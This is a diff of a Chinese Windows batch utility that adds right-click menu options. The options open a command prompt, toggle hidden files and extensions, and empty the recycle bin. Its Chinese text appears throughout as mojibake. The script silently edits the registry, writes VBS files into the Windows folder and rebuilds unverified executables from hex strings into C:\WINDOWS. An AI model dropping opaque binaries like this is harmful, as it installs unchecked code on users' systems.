+reg add "HKCR\*\shell\æ‰“å¼€ms-dos" /ve /d æ‰“å¼€ms-dos /f
+reg add "HKCR\*\shell\æ‰“å¼€ms-dos\command"  /ve /d "cmd.exe /k cd %%1"  /f
+reg add "HKCR\Folder\shell\æ‰“å¼€ms-dos" /ve /d æ‰“å¼€ms-dos /f
+reg add "HKCR\Folder\shell\æ‰“å¼€ms-dos\command" /ve /d "cmd.exe /k cd %%1" /f
 cls
 echo.
-echo                 ÒÑÌí¼Ó´ò¿ªMS-DOS!
+echo                 å·²æ·»åŠ æ‰“å¼€MS-DOS!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 6
 :list6_6a
 MODE con: COLS=50 LINES=15
 cls
-reg delete "HKCR\*\shell\´ò¿ªms-dos" /f
-reg delete "HKCR\Folder\shell\´ò¿ªms-dos" /f
+reg delete "HKCR\*\shell\æ‰“å¼€ms-dos" /f
+reg delete "HKCR\Folder\shell\æ‰“å¼€ms-dos" /f
 cls
 echo.
-echo                   MS-DOSÒÑÉ¾³ı!
+echo                   MS-DOSå·²åˆ é™¤!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 7
 :list7_7
 MODE con: COLS=50 LINES=19
 color 5f
 cls
-echo         ¨q©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤¨r
-echo   ¨q©¤©¤©È     ÏÔÊ¾/Òş²ØÎÄ¼ş+À©Õ¹Ãû     ©À©¤©¤¨r
-echo   ©¦    ¨t©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤¨s    ©¦
-echo   ©¦                                          ©¦
-echo   ©¦  1¡¢ÓÒ¼üÌí¼ÓÏÔÊ¾/Òş²ØÎÄ¼ş+À©Õ¹Ãû         ©¦
-echo   ©¦                                          ©¦
-echo   ©¦  2¡¢ÓÒ¼üÌí¼ÓÏÔÊ¾/Òş²ØÎÄ¼ş                ©¦
-echo   ©¦                                          ©¦
-echo   ©¦  3¡¢ÓÒ¼üÌí¼ÓÏÔÊ¾/Òş²ØÎÄ¼şÀ©Õ¹Ãû          ©¦
-echo   ©¦                                          ©¦
-echo   ©¦  0¡¢·µ»ØÉÏ²ã²Ëµ¥                         ©¦
-echo   ©¦                                          ©¦
-echo   ©¦  e¡¢ÍË³ö                                 ©¦
-echo   ©¦                                          ©¦
-echo   ©¦  ±¾Ò³¸÷Êı×Öºó¼Óa¾ùÎªÈ¡Ïû²Ù×÷,Èç1a»ò2aµÈ  ©¦
-echo   ¨t©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤¨s
-set /p list1=  ÇëÊäÈëÑ¡Ïî:
+echo         â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®
+echo   â•­â”€â”€â”¤     æ˜¾ç¤º/éšè—æ–‡ä»¶+æ‰©å±•å     â”œâ”€â”€â•®
+echo   â”‚    â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯    â”‚
+echo   â”‚                                          â”‚
+echo   â”‚  1ã€å³é”®æ·»åŠ æ˜¾ç¤º/éšè—æ–‡ä»¶+æ‰©å±•å         â”‚
+echo   â”‚                                          â”‚
+echo   â”‚  2ã€å³é”®æ·»åŠ æ˜¾ç¤º/éšè—æ–‡ä»¶                â”‚
+echo   â”‚                                          â”‚
+echo   â”‚  3ã€å³é”®æ·»åŠ æ˜¾ç¤º/éšè—æ–‡ä»¶æ‰©å±•å          â”‚
+echo   â”‚                                          â”‚
+echo   â”‚  0ã€è¿”å›ä¸Šå±‚èœå•                         â”‚
+echo   â”‚                                          â”‚
+echo   â”‚  eã€é€€å‡º                                 â”‚
+echo   â”‚                                          â”‚
+echo   â”‚  æœ¬é¡µå„æ•°å­—ååŠ aå‡ä¸ºå–æ¶ˆæ“ä½œ,å¦‚1aæˆ–2aç­‰  â”‚
+echo   â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯
+set /p list1=  è¯·è¾“å…¥é€‰é¡¹:
 if "%list1%"=="1" goto list1_1
 if "%list1%"=="1a" goto list1_1a
 if "%list1%"=="2" goto list1_2
@@ -2751,9 +2751,9 @@ if "%list1%"=="3a" goto list1_3a
 if "%list1%"=="0" goto startfjcyz
 if "%list1%"=="e" goto exit
 goto 7
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 7
 :list1_1
 MODE con: COLS=50 LINES=15
@@ -2777,7 +2777,7 @@ ECHO "CLSID"="{3f454f0e-42ae-4d7c-8ea3-328250d6e272}">>SHOWALL.reg
 ECHO [HKEY_CLASSES_ROOT\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag]>>SHOWALL.reg
 ECHO "method"="ShellExecute">>SHOWALL.reg
 ECHO "Param1"="SuperHidden.vbs">>SHOWALL.reg
-ECHO "command"="ÏÔÊ¾/Òş²ØÏµÍ³ÎÄ¼ş+À©Õ¹Ãû">>SHOWALL.reg
+ECHO "command"="æ˜¾ç¤º/éšè—ç³»ç»Ÿæ–‡ä»¶+æ‰©å±•å">>SHOWALL.reg
 ECHO "CLSID"="{13709620-C279-11CE-A49E-444553540000}">>SHOWALL.reg
 
 ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]>>SHOWALL.reg
@@ -2801,7 +2801,7 @@ echo.>>%windir%\SuperHidden.vbs
 ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", "0", "REG_DWORD">>%windir%\SuperHidden.vbs
 ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "2", "REG_DWORD">>%windir%\SuperHidden.vbs
 ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "1", "REG_DWORD">>%windir%\SuperHidden.vbs
-ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "ÏÔÊ¾ÏµÍ³ÎÄ¼ş+À©Õ¹Ãû", "REG_SZ">>%windir%\SuperHidden.vbs
+ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "æ˜¾ç¤ºç³»ç»Ÿæ–‡ä»¶+æ‰©å±•å", "REG_SZ">>%windir%\SuperHidden.vbs
 ECHO WSHShell.SendKeys "{F5}+{F10}e">>%windir%\SuperHidden.vbs
 ECHO 'WSHShell.Popup "Poof, they're gone!", 1, sTitle1, vbInformation>>%windir%\SuperHidden.vbs
 echo.>>%windir%\SuperHidden.vbs
@@ -2810,7 +2810,7 @@ echo.>>%windir%\SuperHidden.vbs
 ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", "1", "REG_DWORD">>%windir%\SuperHidden.vbs
 ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "1", "REG_DWORD">>%windir%\SuperHidden.vbs
 ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "0", "REG_DWORD">>%windir%\SuperHidden.vbs
-ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "Òş²ØÏµÍ³ÎÄ¼ş+À©Õ¹Ãû", "REG_SZ">>%windir%\SuperHidden.vbs
+ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "éšè—ç³»ç»Ÿæ–‡ä»¶+æ‰©å±•å", "REG_SZ">>%windir%\SuperHidden.vbs
 ECHO WSHShell.SendKeys "{F5}+{F10}e">>%windir%\SuperHidden.vbs
 ECHO 'WSHShell.Popup "Here they are!", 1, sTitle2, vbInformation>>%windir%\SuperHidden.vbs
 echo.>>%windir%\SuperHidden.vbs
@@ -2824,13 +2824,13 @@ echo.
 echo.
 echo.
 echo.
-echo            ³É¹¦Ìí¼ÓÏÔÊ¾/Òş²ØÎÄ¼ş¼ÓÀ©Õ¹Ãû!
+echo            æˆåŠŸæ·»åŠ æ˜¾ç¤º/éšè—æ–‡ä»¶åŠ æ‰©å±•å!
 echo.
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto list7_7
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 7
 :list1_1a
 MODE con: COLS=50 LINES=15
@@ -2857,13 +2857,13 @@ echo.
 echo.
 echo.
 echo.
-echo            ÏÔÊ¾/Òş²ØÎÄ¼ş¼ÓÀ©Õ¹ÃûÉ¾³ı³É¹¦!
+echo            æ˜¾ç¤º/éšè—æ–‡ä»¶åŠ æ‰©å±•ååˆ é™¤æˆåŠŸ!
 echo.
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto list7_7
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 7
 :list1_2
 MODE con: COLS=50 LINES=15
@@ -2887,7 +2887,7 @@ ECHO "CLSID"="{3f454f0e-42ae-4d7c-8ea3-328250d6e272}">>SHOWALL.reg
 ECHO [HKEY_CLASSES_ROOT\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag]>>SHOWALL.reg
 ECHO "method"="ShellExecute">>SHOWALL.reg
 ECHO "Param1"="SuperHidden.vbs">>SHOWALL.reg
-ECHO "command"="ÏÔÊ¾/Òş²ØÏµÍ³ÎÄ¼ş">>SHOWALL.reg
+ECHO "command"="æ˜¾ç¤º/éšè—ç³»ç»Ÿæ–‡ä»¶">>SHOWALL.reg
 ECHO "CLSID"="{13709620-C279-11CE-A49E-444553540000}">>SHOWALL.reg
 
 ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]>>SHOWALL.reg
@@ -2910,7 +2910,7 @@ ECHO if WSHShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explore
 echo.>>%windir%\SuperHidden.vbs 
 ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", "0", "REG_DWORD">>%windir%\SuperHidden.vbs 
 ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "2", "REG_DWORD">>%windir%\SuperHidden.vbs 
-ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "ÏÔÊ¾ÏµÍ³ÎÄ¼ş", "REG_SZ">>%windir%\SuperHidden.vbs 
+ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "æ˜¾ç¤ºç³»ç»Ÿæ–‡ä»¶", "REG_SZ">>%windir%\SuperHidden.vbs 
 ECHO WSHShell.SendKeys "{F5}+{F10}e">>%windir%\SuperHidden.vbs 
 ECHO 'WSHShell.Popup "Poof, they're gone!", 1, sTitle1, vbInformation>>%windir%\SuperHidden.vbs 
 echo.>>%windir%\SuperHidden.vbs 
@@ -2918,7 +2918,7 @@ ECHO else>>%windir%\SuperHidden.vbs
 echo.>>%windir%\SuperHidden.vbs
 ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", "1", "REG_DWORD">>%windir%\SuperHidden.vbs 
 ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "1", "REG_DWORD">>%windir%\SuperHidden.vbs 
-ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "Òş²ØÏµÍ³ÎÄ¼ş", "REG_SZ">>%windir%\SuperHidden.vbs 
+ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "éšè—ç³»ç»Ÿæ–‡ä»¶", "REG_SZ">>%windir%\SuperHidden.vbs 
 ECHO WSHShell.SendKeys "{F5}+{F10}e">>%windir%\SuperHidden.vbs 
 ECHO 'WSHShell.Popup "Here they are!", 1, sTitle2, vbInformation>>%windir%\SuperHidden.vbs 
 echo.>>%windir%\SuperHidden.vbs 
@@ -2927,7 +2927,7 @@ echo.>>%windir%\SuperHidden.vbs
 ECHO Set WSHShell = Nothing>>%windir%\SuperHidden.vbs 
 ECHO WScript.Quit(0)>>%windir%\SuperHidden.vbs 
 cls
-echo.ÕıÔÚÉú³ÉÖĞ£¬ÇëÉÔºò...
+echo.æ­£åœ¨ç”Ÿæˆä¸­ï¼Œè¯·ç¨å€™...
 @echo str="4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000B80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000"_>>debug.vbs
 @echo +"8F8AF9DBCBEB9788CBEB9788CBEB978848F79988CAEB9788A2F49E88CAEB978822F49A88CAEB978852696368CBEB97880000000000000000504500004C0103001A5CB4450000000000000000E0000F010B010600002000000020000000000000D811000000100000003000000000400000100000001000000400000001000000"_>>debug.vbs
 @echo +"0400000000000000005000000010000027180100020000000000100000100000000010000010000000000000100000000000000000000000242600002800000000400000F80800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@@ -3098,13 +3098,13 @@ cls
 ECHO Windows Registry Editor Version 5.00>SHOWALL.reg
 
 ECHO [HKEY_CLASSES_ROOT\AllFilesystemObjects\shell\SuperHidden]>>SHOWALL.reg
-ECHO @="ÏÔÊ¾ÏµÍ³Òş²ØÎÄ¼ş">>SHOWALL.reg
+ECHO @="æ˜¾ç¤ºç³»ç»Ÿéšè—æ–‡ä»¶">>SHOWALL.reg
 
 ECHO [HKEY_CLASSES_ROOT\AllFilesystemObjects\shell\SuperHidden\Command]>>SHOWALL.reg
 ECHO @="C:\\WINDOWS\\winzheng\\yincang.exe">>SHOWALL.reg
 
 ECHO [HKEY_CLASSES_ROOT\Folder\shell\SuperHidden]>>SHOWALL.reg
-ECHO @="Òş²ØÏµÍ³Òş²ØÎÄ¼ş">>SHOWALL.reg
+ECHO @="éšè—ç³»ç»Ÿéšè—æ–‡ä»¶">>SHOWALL.reg
 
 ECHO [HKEY_CLASSES_ROOT\Folder\shell\SuperHidden\Command]>>SHOWALL.reg
 ECHO @="C:\\WINDOWS\\winzheng\\yincang.exe">>SHOWALL.reg
@@ -3113,7 +3113,7 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 
 exit
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 7
 :list1_2a
 MODE con: COLS=50 LINES=15
@@ -3143,13 +3143,13 @@ echo.
 echo.
 echo.
 echo.
-echo               ÏÔÊ¾/Òş²ØÎÄ¼şÉ¾³ı³É¹¦!
+echo               æ˜¾ç¤º/éšè—æ–‡ä»¶åˆ é™¤æˆåŠŸ!
 echo.
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto list7_7
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 7
 :list1_3
 MODE con: COLS=50 LINES=15
@@ -3173,7 +3173,7 @@ ECHO "CLSID"="{3f454f0e-42ae-4d7c-8ea3-328250d6e272}">>SHOWALL.reg
 ECHO [HKEY_CLASSES_ROOT\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag]>>SHOWALL.reg
 ECHO "method"="ShellExecute">>SHOWALL.reg
 ECHO "Param1"="SuperHidden.vbs">>SHOWALL.reg
-ECHO "command"="ÏÔÊ¾/Òş²ØÀ©Õ¹Ãû">>SHOWALL.reg
+ECHO "command"="æ˜¾ç¤º/éšè—æ‰©å±•å">>SHOWALL.reg
 ECHO "CLSID"="{13709620-C279-11CE-A49E-444553540000}">>SHOWALL.reg
 
 ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]>>SHOWALL.reg
@@ -3196,7 +3196,7 @@ ECHO if WSHShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explore
 echo.>>C:\WINDOWS\SuperHidden.vbs 
 ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", "0", "REG_DWORD">>C:\WINDOWS\SuperHidden.vbs 
 ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "1", "REG_DWORD">>C:\WINDOWS\SuperHidden.vbs 
-ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "ÏÔÊ¾ÎÄ¼şÀ©Õ¹Ãû", "REG_SZ">>C:\WINDOWS\SuperHidden.vbs 
+ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "æ˜¾ç¤ºæ–‡ä»¶æ‰©å±•å", "REG_SZ">>C:\WINDOWS\SuperHidden.vbs 
 ECHO WSHShell.SendKeys "{F5}+{F10}e">>C:\WINDOWS\SuperHidden.vbs 
 ECHO 'WSHShell.Popup "Poof, they're gone!", 1, sTitle1, vbInformation>>C:\WINDOWS\SuperHidden.vbs 
 echo.>>C:\WINDOWS\SuperHidden.vbs 
@@ -3204,7 +3204,7 @@ ECHO else>>C:\WINDOWS\SuperHidden.vbs
 echo.>>C:\WINDOWS\SuperHidden.vbs 
 ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", "1", "REG_DWORD">>C:\WINDOWS\SuperHidden.vbs 
 ECHO WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "0", "REG_DWORD">>C:\WINDOWS\SuperHidden.vbs 
-ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "Òş²ØÎÄ¼şÀ©Õ¹Ãû", "REG_SZ">>C:\WINDOWS\SuperHidden.vbs 
+ECHO WSHShell.RegWrite "HKCR\CLSID\{00000000-0000-0000-0000-000000000012}\Instance\InitPropertyBag\command", "éšè—æ–‡ä»¶æ‰©å±•å", "REG_SZ">>C:\WINDOWS\SuperHidden.vbs 
 ECHO WSHShell.SendKeys "{F5}+{F10}e">>C:\WINDOWS\SuperHidden.vbs 
 ECHO 'WSHShell.Popup "Here they are!", 1, sTitle2, vbInformation>>C:\WINDOWS\SuperHidden.vbs 
 echo.>>C:\WINDOWS\SuperHidden.vbs 
@@ -3213,7 +3213,7 @@ echo.>>C:\WINDOWS\SuperHidden.vbs
 ECHO Set WSHShell = Nothing>>C:\WINDOWS\SuperHidden.vbs 
 ECHO WScript.Quit(0)>>C:\WINDOWS\SuperHidden.vbs 
 cls
-echo.ÕıÔÚÉú³ÉÖĞ£¬ÇëÉÔºò...
+echo.æ­£åœ¨ç”Ÿæˆä¸­ï¼Œè¯·ç¨å€™...
 @echo str="4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000B80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000"_>>debug.vbs
 @echo +"8F8AF9DBCBEB9788CBEB9788CBEB978848F79988CAEB9788A2F49E88CAEB978822F49A88CAEB978852696368CBEB97880000000000000000504500004C010300B957B4450000000000000000E0000F010B010600002000000020000000000000D811000000100000003000000000400000100000001000000400000001000000"_>>debug.vbs
 @echo +"04000000000000000050000000100000F1F80000020000000000100000100000000010000010000000000000100000000000000000000000042400002800000000400000100900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"_>>debug.vbs
@@ -3384,13 +3384,13 @@ cls
 ECHO Windows Registry Editor Version 5.00>SHOWALL.reg
 
 ECHO [HKEY_CLASSES_ROOT\AllFilesystemObjects\shell\HideFileExt]>>SHOWALL.reg
-ECHO @="ÏÔÊ¾ÒÑÖªÎÄ¼şÀ©Õ¹Ãû">>SHOWALL.reg
+ECHO @="æ˜¾ç¤ºå·²çŸ¥æ–‡ä»¶æ‰©å±•å">>SHOWALL.reg
 
 ECHO [HKEY_CLASSES_ROOT\AllFilesystemObjects\shell\HideFileExt\Command]>>SHOWALL.reg
 ECHO @="C:\\WINDOWS\\winzheng\\kuozhangming.exe">>SHOWALL.reg
 
 ECHO [HKEY_CLASSES_ROOT\Folder\shell\HideFileExt]>>SHOWALL.reg
-ECHO @="Òş²ØÒÑÖªÎÄ¼şÀ©Õ¹Ãû">>SHOWALL.reg
+ECHO @="éšè—å·²çŸ¥æ–‡ä»¶æ‰©å±•å">>SHOWALL.reg
 
 ECHO [HKEY_CLASSES_ROOT\Folder\shell\HideFileExt\Command]>>SHOWALL.reg
 ECHO @="C:\\WINDOWS\\winzheng\\kuozhangming.exe">>SHOWALL.reg
@@ -3399,7 +3399,7 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 
 exit
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 7
 :list1_3a
 MODE con: COLS=50 LINES=15
@@ -3429,13 +3429,13 @@ echo.
 echo.
 echo.
 echo.
-echo              ÏÔÊ¾/Òş²ØÀ©Õ¹ÃûÉ¾³ı³É¹¦!
+echo              æ˜¾ç¤º/éšè—æ‰©å±•ååˆ é™¤æˆåŠŸ!
 echo.
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto list7_7
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 8
 :list8_8
 MODE con: COLS=50 LINES=15
@@ -3448,12 +3448,12 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 cls
 echo.
-echo                Çå¿Õ»ØÊÕÕ¾Ìí¼Ó³É¹¦!
+echo                æ¸…ç©ºå›æ”¶ç«™æ·»åŠ æˆåŠŸ!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 8
 :list8_8a
 MODE con: COLS=50 LINES=15
@@ -3467,32 +3467,32 @@ REGEDIT /S SHOWALL.reg
 DEL /F /Q SHOWALL.reg
 cls
 echo.
-echo                Çå¿Õ»ØÊÕÕ¾É¾³ı³É¹¦!
+echo                æ¸…ç©ºå›æ”¶ç«™åˆ é™¤æˆåŠŸ!
 echo.
-echo                   °´ÈÎÒâ¼ü·µ»Ø!
+echo                   æŒ‰ä»»æ„é”®è¿”å›!
 pause>nul
 goto startfjcyz
-rem ¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î¡î
+rem â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†â˜†
 goto 9
 :list9_9
 MODE con: COLS=50 LINES=17
 color 5f
 cls
-echo         ¨q©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤¨r
-echo   ¨q©¤©¤©È        ÓÒ  ¼ü  ¹â  Çı        ©À©¤©¤¨r
-echo   ©¦    ¨t©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤©¤¨s    ©¦
-echo   ©¦                                          ©¦
-echo   ©¦  1¡¢ÓÒ¼üÌí¼Ó¹Ø±Õ¹âÇı                     ©¦
-echo   ©¦                                          ©¦
-echo   ©¦  2¡¢ÓÒ¼üÌí¼Ó´ò¿ª¹âÇı                     ©¦
-echo   ©¦                                          ©¦
-echo   ©¦  0¡¢·µ»ØÉÏ²ã²Ëµ¥                         ©¦
-echo   ©¦                                          ©¦
-echo   ©¦  e¡¢ÍË³ö                                 ©¦
-echo   ©¦                                          ©¦
